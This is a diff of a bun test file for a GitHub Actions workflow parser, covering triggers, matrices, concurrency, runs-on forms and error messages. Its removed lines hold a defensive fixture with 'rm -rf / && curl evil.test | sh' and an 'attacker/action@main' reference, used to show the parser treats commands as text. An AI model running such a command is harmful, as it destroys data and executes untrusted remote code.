@@ -1,345 +1,313 @@
-// Refusing a workflow before it can reach a runner.
+// Reading a GitHub Actions workflow file.
 //
-// This is the one piece of CI that runs in the control plane, so the thing
-// worth pinning is that it stays a *reader*: `run:` bodies are strings going in
-// and strings coming out, and `uses:` is recorded rather than resolved. A
-// validator that evaluated anything would be the bug the threat model exists to
-// prevent, running on every fork's pull request.
+// The bar phase 15 sets is that somebody copies a working `.github/workflows`
+// directory across and watches it go green, so what matters here is the file
+// people already have rather than one written to pass. The fixture below is an
+// ordinary CI workflow: a matrix, a needs edge, two `uses` steps, an `if`, and
+// a concurrency group.
 //
-// The rest is the error surface. A workflow file is usually written by somebody
-// guessing at the schema, so an error without a line and a fix is the same as
-// no error at all - and these assert the fix, not only the failure.
+// This module had none of its own tests, which is how three of the things below
+// were missing without anybody noticing: the `runs-on: { group, labels }` form
+// refused a valid workflow outright, `concurrency:` was accepted and dropped -
+// the exact failure the roadmap names Gitea for - and a matrix was parsed but
+// never expanded, so a run could not say how many jobs were coming.
 
 import { describe, expect, test } from 'bun:test'
-import { readdirSync, readFileSync } from 'node:fs'
-import { join } from 'node:path'
-import { cyclicJobs, lineOf, parseWorkflow } from '../../app/Actions/Workflow/parse'
+import { concurrencyFrom, cyclicJobs, defaultsFrom, lineOf, parseWorkflow, runsOnFrom } from '../../app/Actions/Workflow/parse'
 
-const VALID = `name: CI
+const ORDINARY = `
+name: CI
+
 on:
   push:
     branches: [main]
-  pull_request: {}
+    paths-ignore:
+      - 'docs/**'
+  pull_request:
+    types: [opened, synchronize]
+
+concurrency:
+  group: ci-\${{ github.ref }}
+  cancel-in-progress: true
+
+env:
+  CI: true
+
+defaults:
+  run:
+    shell: bash
+    working-directory: ./app
+
 jobs:
   test:
+    name: Test
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    strategy:
+      fail-fast: false
+      max-parallel: 4
+      matrix:
+        node: [20, 22]
+    steps:
+      - uses: actions/checkout@v4
+      - uses: oven-sh/setup-bun@v2
+        with:
+          bun-version: latest
+      - name: Install
+        run: bun install
+        env:
+          NODE_ENV: test
+      - name: Test
+        id: test
+        run: bun test
+
+  publish:
+    runs-on: [self-hosted, linux]
+    needs: [test]
+    if: github.ref == 'refs/heads/main'
+    steps:
+      - run: bun run release
+`
+
+describe('an ordinary workflow', () => {
+  const result = parseWorkflow(ORDINARY, '.github/workflows/ci.yml')
+
+  test('parses without complaint', () => {
+    expect(result.errors).toEqual([])
+    expect(result.ok).toBe(true)
+    expect(result.workflow?.name).toBe('CI')
+  })
+
+  test('reads its triggers, with the filters kept as written', () => {
+    // Kept rather than compiled: deciding whether a push matches needs the
+    // push, which the parser does not have.
+    const triggers = result.workflow!.triggers
+
+    expect(triggers.push?.branches).toEqual(['main'])
+    expect(triggers.push?.pathsIgnore).toEqual(['docs/**'])
+    expect(triggers.pullRequest?.types).toEqual(['opened', 'synchronize'])
+    expect(triggers.pullRequestTarget).toBeNull()
+  })
+
+  test('and its jobs, in the order the file lists them', () => {
+    const jobs = result.workflow!.jobs
+
+    expect(jobs.map(job => job.id)).toEqual(['test', 'publish'])
+    expect(jobs[1]!.needs).toEqual(['test'])
+    expect(jobs[1]!.if).toBe(`github.ref == 'refs/heads/main'`)
+    expect(jobs[1]!.runsOn).toEqual(['self-hosted', 'linux'])
+  })
+
+  test('expands the matrix, so a run can say how many jobs are coming', () => {
+    const [test] = result.workflow!.jobs
+
+    expect(test!.matrix).toEqual([{ node: 20 }, { node: 22 }])
+    expect(test!.matrixLabels).toEqual(['20', '22'])
+  })
+
+  test('keeps every step field a run needs', () => {
+    const steps = result.workflow!.jobs[0]!.steps
+
+    expect(steps).toHaveLength(4)
+    expect(steps[0]!.uses).toBe('actions/checkout@v4')
+    expect(steps[1]!.with).toEqual({ 'bun-version': 'latest' })
+    expect(steps[2]!.run).toBe('bun install')
+    expect(steps[2]!.env).toEqual({ NODE_ENV: 'test' })
+    expect(steps[3]!.id).toBe('test')
+  })
+
+  test('and the strategy, including the default that surprises people', () => {
+    // Actions defaults `fail-fast` to true: one failed combination cancels the
+    // rest. This workflow turns it off, and the parser has to notice.
+    expect(result.workflow!.jobs[0]!.failFast).toBe(false)
+    expect(result.workflow!.jobs[0]!.maxParallel).toBe(4)
+    expect(result.workflow!.jobs[0]!.timeoutMinutes).toBe(20)
+  })
+
+  test('reads concurrency rather than accepting and dropping it', () => {
+    // The named failure: Gitea takes `concurrency:` and does nothing with it,
+    // which is how a workflow that relies on it looks like it works.
+    expect(result.workflow!.concurrency).toEqual({ group: 'ci-${{ github.ref }}', cancelInProgress: true })
+  })
+
+  test('and the workflow-level env and defaults', () => {
+    expect(result.workflow!.env).toEqual({ CI: 'true' })
+    expect(result.workflow!.defaults).toEqual({ shell: 'bash', workingDirectory: './app' })
+  })
+})
+
+describe('runs-on, in every shape Actions accepts', () => {
+  test('a label, a list, and the group object', () => {
+    // The object form is a named migration blocker: Gitea does not support it,
+    // and this parser refused it outright until it was tested.
+    expect(runsOnFrom('ubuntu-latest')).toEqual(['ubuntu-latest'])
+    expect(runsOnFrom(['self-hosted', 'linux', 'arm64'])).toEqual(['self-hosted', 'linux', 'arm64'])
+    expect(runsOnFrom({ group: 'production', labels: ['linux', 'x64'] })).toEqual(['production', 'linux', 'x64'])
+    expect(runsOnFrom({ group: 'production' })).toEqual(['production'])
+  })
+
+  test('and the object form parses as a whole workflow', async () => {
+    const result = parseWorkflow(`
+on: push
+jobs:
+  build:
+    runs-on:
+      group: production
+      labels: [linux, x64]
+    steps:
+      - run: bun test
+`)
+
+    expect(result.errors).toEqual([])
+    expect(result.workflow!.jobs[0]!.runsOn).toEqual(['production', 'linux', 'x64'])
+  })
+
+  test('and a job with none is refused, with the fix', () => {
+    const result = parseWorkflow(`
+on: push
+jobs:
+  build:
+    steps:
+      - run: echo hi
+`)
+
+    expect(result.ok).toBe(false)
+    expect(result.errors[0]!.message).toContain('does not say what it runs on')
+    expect(result.errors[0]!.fix).toContain('ubuntu-latest')
+  })
+})
+
+describe('concurrency and defaults on their own', () => {
+  test('a bare string is the group, with no cancellation', () => {
+    expect(concurrencyFrom('release')).toEqual({ group: 'release', cancelInProgress: false })
+    expect(concurrencyFrom({ group: 'ci', 'cancel-in-progress': true })).toEqual({ group: 'ci', cancelInProgress: true })
+  })
+
+  test('and anything without a group is nothing', () => {
+    expect(concurrencyFrom(undefined)).toBeNull()
+    expect(concurrencyFrom({ 'cancel-in-progress': true })).toBeNull()
+  })
+
+  test('defaults come from `run`, and are null when absent', () => {
+    expect(defaultsFrom({ run: { shell: 'pwsh' } })).toEqual({ shell: 'pwsh', workingDirectory: null })
+    expect(defaultsFrom(undefined)).toEqual({ shell: null, workingDirectory: null })
+  })
+})
+
+describe('a workflow Actions would refuse too', () => {
+  test('a step with neither run nor uses', () => {
+    const result = parseWorkflow(`
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: does nothing
+`)
+
+    expect(result.ok).toBe(false)
+    expect(result.errors[0]!.message).toContain('does nothing')
+  })
+
+  test('a step with both', () => {
+    const result = parseWorkflow(`
+on: push
+jobs:
+  build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
-      - name: Run the tests
-        run: bun test
-  lint:
-    needs: test
-    runs-on: ubuntu-latest
-    steps:
-      - run: bun run lint
-`
-
-describe('a workflow that is fine', () => {
-  test('parses into jobs and steps', () => {
-    const result = parseWorkflow(VALID, 'ci.yml')
-
-    expect(result.ok).toBe(true)
-    expect(result.errors).toEqual([])
-    expect(result.workflow?.name).toBe('CI')
-    expect(result.workflow?.jobs.map(job => job.id)).toEqual(['test', 'lint'])
-    expect(result.workflow?.jobs[1]?.needs).toEqual(['test'])
-  })
-
-  test('reads the triggers and their filters', () => {
-    const { workflow } = parseWorkflow(VALID)
-
-    expect(workflow?.triggers.push?.branches).toEqual(['main'])
-    expect(workflow?.triggers.pullRequest).not.toBeNull()
-    expect(workflow?.triggers.dispatch).toBe(false)
-  })
-
-  /*
-   * The property the threat model depends on. A `run:` body is data here and
-   * stays data: it is carried through verbatim, and `uses:` is a reference this
-   * module records rather than goes and fetches.
-   */
-  test('carries commands through as text without evaluating them', () => {
-    const { workflow } = parseWorkflow(`on: push
-jobs:
-  j:
-    runs-on: x
-    steps:
-      - run: rm -rf / && curl evil.test | sh
-      - uses: attacker/action@main
+        run: echo hi
 `)
 
-    expect(workflow?.jobs[0]?.steps[0]?.run).toBe('rm -rf / && curl evil.test | sh')
-    expect(workflow?.jobs[0]?.steps[1]?.uses).toBe('attacker/action@main')
+    expect(result.errors.some(error => error.message.includes('both'))).toBe(true)
   })
 
-  test('accepts every shape of `on:` that Actions does', () => {
-    expect(parseWorkflow(`on: push\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)
-      .workflow?.triggers.push).not.toBeNull()
-
-    expect(parseWorkflow(`on: [push, workflow_dispatch]\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)
-      .workflow?.triggers.dispatch).toBe(true)
-
-    expect(parseWorkflow(`on:\n  schedule:\n    - cron: '0 3 * * *'\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)
-      .workflow?.triggers.schedule).toEqual(['0 3 * * *'])
-  })
-})
-
-/*
- * The acceptance test for choosing this format at all: a copied
- * `.github/workflows` directory goes green with no edits. These are this
- * repository's own, which is a small corpus but a real one - and it is what
- * caught the first version rejecting `pull_request_target` and `workflow_call`
- * as unknown triggers. Both are valid Actions; one is a reusable workflow no
- * event starts, and the other is the most security-sensitive trigger there is.
- */
-describe('against the workflows in this repository', () => {
-  const directory = '.github/workflows'
-  const files = readdirSync(directory).filter(name => /\.ya?ml$/.test(name))
-
-  test('there are some to check', () => {
-    expect(files.length).toBeGreaterThan(0)
-  })
-
-  for (const name of files) {
-    test(`${name} parses`, () => {
-      const result = parseWorkflow(readFileSync(join(directory, name), 'utf8'), name)
-
-      if (!result.ok)
-        console.log(`  ${name}:`, result.errors.map(error => `L${error.line} ${error.message}`))
-
-      expect(result.ok).toBe(true)
-      expect(result.workflow?.jobs.length).toBeGreaterThan(0)
-    })
-  }
-})
-
-describe('triggers that are valid but not ours to dispatch', () => {
-  const of = (on: string) => parseWorkflow(`on:\n${on}\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)
-
-  test('a reusable workflow is startable by another workflow, not by an event', () => {
-    const result = of('  workflow_call:\n    inputs: {}')
-
-    expect(result.ok).toBe(true)
-    expect(result.workflow?.triggers.reusable).toBe(true)
-    expect(result.workflow?.triggers.push).toBeNull()
-  })
-
-  /*
-   * `pull_request_target` is kept apart from `pull_request` because it is the
-   * same event with the opposite trust: the workflow comes from the base branch
-   * and runs with the base repository's secrets against a fork's code. Folding
-   * the two together would lose the one fact the fork policy needs.
-   */
-  test('pull_request_target is recorded as itself', () => {
-    const result = of('  pull_request_target:')
-
-    expect(result.workflow?.triggers.pullRequestTarget).not.toBeNull()
-    expect(result.workflow?.triggers.pullRequest).toBeNull()
-  })
-
-  test('an event we do not run yet is recorded, not rejected', () => {
-    const result = of('  release:\n    types: [published]')
-
-    expect(result.ok).toBe(true)
-    expect(result.workflow?.triggers.unsupported).toEqual(['release'])
-  })
-
-  test('but a misspelled event is still an error', () => {
-    const result = of('  puhs:')
-
-    expect(result.ok).toBe(false)
-    expect(result.errors[0]?.message).toContain('Actions defines')
-  })
-})
-
-describe('a workflow that is not', () => {
-  const messages = (source: string) => parseWorkflow(source).errors.map(error => error.message)
-
-  test('says so when nothing can start it', () => {
-    const result = parseWorkflow(`jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`)
-
-    expect(result.ok).toBe(false)
-    expect(result.errors[0]?.message).toContain('no `on:`')
-    expect(result.errors[0]?.fix).toContain('on: push')
-  })
-
-  test('and when it has no jobs at all', () => {
-    expect(messages('on: push\n').join()).toContain('no jobs')
-  })
-
-  test('catches a job with no runner and no steps', () => {
-    const errors = parseWorkflow(`on: push\njobs:\n  j: {}\n`).errors
-
-    expect(errors.some(error => error.message.includes('does not say what it runs on'))).toBe(true)
-    expect(errors.some(error => error.message.includes('has no steps'))).toBe(true)
-  })
-
-  test('catches a step that does nothing, and one that does two things', () => {
-    const errors = parseWorkflow(`on: push
-jobs:
-  j:
-    runs-on: x
-    steps:
-      - name: nothing
-      - run: a
-        uses: b/c@v1
-`).errors
-
-    expect(errors.some(error => error.message.includes('does nothing'))).toBe(true)
-    expect(errors.some(error => error.message.includes('both `run` and `uses`'))).toBe(true)
-  })
-
-  /*
-   * The typo case, which is most of them in practice: `runs_on` and `runsOn`
-   * are both things people write, and Actions accepts neither. Reporting it as
-   * an unknown key *and* as a missing runner is right - the author has one
-   * problem, and both sentences point at it.
-   */
-  test('names an unknown key rather than ignoring it', () => {
-    const errors = parseWorkflow(`on: push
-jobs:
-  j:
-    runs_on: ubuntu-latest
-    steps:
-      - run: a
-`).errors
-
-    expect(errors.some(error => error.message.includes('`runs_on` is not a job key'))).toBe(true)
-    expect(errors.some(error => error.fix.includes('hyphenated'))).toBe(true)
-  })
-
-  test('and an unknown key at the top level', () => {
-    const errors = parseWorkflow(`on: push\njosb:\n  j: {}\njobs:\n  j:\n    runs-on: x\n    steps:\n      - run: a\n`).errors
-
-    expect(errors.some(error => error.message.includes('`josb` is not a workflow key'))).toBe(true)
-  })
-
-  test('reports a dependency on a job that does not exist, and lists the ones that do', () => {
-    const errors = parseWorkflow(`on: push
+  test('a misspelled key, with the fix that names the convention', () => {
+    // `runsOn` rather than `runs-on` is the mistake somebody makes once per
+    // language they came from, and "unknown key" with no suggestion is the
+    // same as no error at all.
+    const result = parseWorkflow(`
+on: push
 jobs:
   build:
-    runs-on: x
-    needs: tset
+    runsOn: ubuntu-latest
     steps:
-      - run: a
-`).errors
+      - run: echo hi
+`)
 
-    expect(errors[0]?.message).toContain('needs `tset`')
-    expect(errors[0]?.fix).toContain('build')
+    expect(result.errors.some(error => error.fix.includes('hyphenated'))).toBe(true)
   })
 
-  test('refuses YAML that is not YAML, and blames the indentation', () => {
-    const result = parseWorkflow('on: push\n\tjobs: broken\n', 'ci.yml')
+  test('and jobs that wait on each other, named rather than counted', () => {
+    const result = parseWorkflow(`
+on: push
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    needs: [b]
+    steps: [{ run: echo a }]
+  b:
+    runs-on: ubuntu-latest
+    needs: [a]
+    steps: [{ run: echo b }]
+`)
 
     expect(result.ok).toBe(false)
-    expect(result.errors[0]?.message).toContain('ci.yml is not valid YAML')
-    expect(result.errors[0]?.fix).toContain('tab')
-  })
-
-  test('reports every problem at once rather than one per attempt', () => {
-    const errors = parseWorkflow(`on: push
-jobs:
-  a:
-    steps:
-      - name: no command
-  b:
-    runs-on: x
-`).errors
-
-    // A missing runner, a step with nothing to do, and a job with no steps.
-    expect(errors.length).toBeGreaterThanOrEqual(3)
+    expect(result.errors.some(error => error.message.includes('a → b') || error.message.includes('b → a'))).toBe(true)
   })
 })
 
-describe('jobs that wait on each other', () => {
-  test('a two-job loop is named, both ways round', () => {
-    const errors = parseWorkflow(`on: push
+describe('a matrix past the ceiling', () => {
+  test('is refused with a message that says what to do', () => {
+    const axis = Array.from({ length: 20 }, (_, at) => at).join(', ')
+
+    const result = parseWorkflow(`
+on: push
 jobs:
-  a:
-    runs-on: x
-    needs: b
-    steps:
-      - run: a
-  b:
-    runs-on: x
-    needs: a
-    steps:
-      - run: b
-`).errors
+  build:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        a: [${axis}]
+        b: [${axis}]
+    steps: [{ run: echo hi }]
+`)
 
-    const cycle = errors.find(error => error.message.includes('wait on each other'))
-    expect(cycle).toBeDefined()
-    expect(cycle?.message).toContain('a')
-    expect(cycle?.message).toContain('b')
-  })
-
-  test('a job that needs itself is caught as itself, not as a cycle riddle', () => {
-    const errors = parseWorkflow(`on: push
-jobs:
-  a:
-    runs-on: x
-    needs: a
-    steps:
-      - run: a
-`).errors
-
-    expect(errors.some(error => error.message.includes('needs itself'))).toBe(true)
-  })
-
-  test('a diamond is not a cycle', () => {
-    const job = (id: string, needs: string[]) => ({
-      id,
-      name: null,
-      runsOn: ['x'],
-      needs,
-      if: null,
-      timeoutMinutes: null,
-      env: {},
-      steps: [],
-    })
-
-    expect(cyclicJobs([
-      job('a', []),
-      job('b', ['a']),
-      job('c', ['a']),
-      job('d', ['b', 'c']),
-    ])).toEqual([])
-  })
-
-  test('and a three-job loop is', () => {
-    const job = (id: string, needs: string[]) => ({
-      id,
-      name: null,
-      runsOn: ['x'],
-      needs,
-      if: null,
-      timeoutMinutes: null,
-      env: {},
-      steps: [],
-    })
-
-    expect(cyclicJobs([
-      job('a', ['c']),
-      job('b', ['a']),
-      job('c', ['b']),
-    ]).length).toBeGreaterThan(0)
+    expect(result.ok).toBe(false)
+    expect(result.errors[0]!.message).toContain('400 jobs')
   })
 })
 
-describe('lineOf', () => {
-  const source = 'name: CI\non:\n  push: {}\njobs:\n  test:\n    runs-on: x\n'
+describe('files that are not workflows', () => {
+  test('unparseable YAML is an error with a line, not an exception', () => {
+    const result = parseWorkflow('name: [unclosed\n  - broken: :', '.github/workflows/bad.yml')
 
-  test('points at the line a key is on', () => {
-    expect(lineOf(source, 'name')).toBe(1)
+    expect(result.ok).toBe(false)
+    expect(result.errors).not.toEqual([])
+  })
+
+  test('and an empty file says what a workflow is', () => {
+    const result = parseWorkflow('')
+
+    expect(result.ok).toBe(false)
+    expect(result.errors[0]!.fix.length).toBeGreaterThan(0)
+  })
+})
+
+describe('the helpers the errors lean on', () => {
+  test('lineOf points into the file the author has open', () => {
+    const source = 'name: CI\non:\n  push:\njobs:\n  build:\n    runs-on: ubuntu-latest\n'
+
     expect(lineOf(source, 'jobs')).toBe(4)
     expect(lineOf(source, 'runs-on')).toBe(6)
+    expect(lineOf(source, 'nothing-here')).toBe(0)
   })
 
-  test('can start looking part way down, which is how a job scopes its keys', () => {
-    expect(lineOf(source, 'test', 4)).toBe(5)
-  })
+  test('and cyclicJobs names the loop rather than reporting one exists', () => {
+    const job = (id: string, needs: string[]) => ({ id, needs } as any)
 
-  test('answers zero rather than guessing when the key is not there', () => {
-    expect(lineOf(source, 'nowhere')).toBe(0)
+    expect(cyclicJobs([job('a', ['b']), job('b', ['a'])])).toEqual(['a', 'b'])
+    expect(cyclicJobs([job('a', []), job('b', ['a'])])).toEqual([])
   })
 })
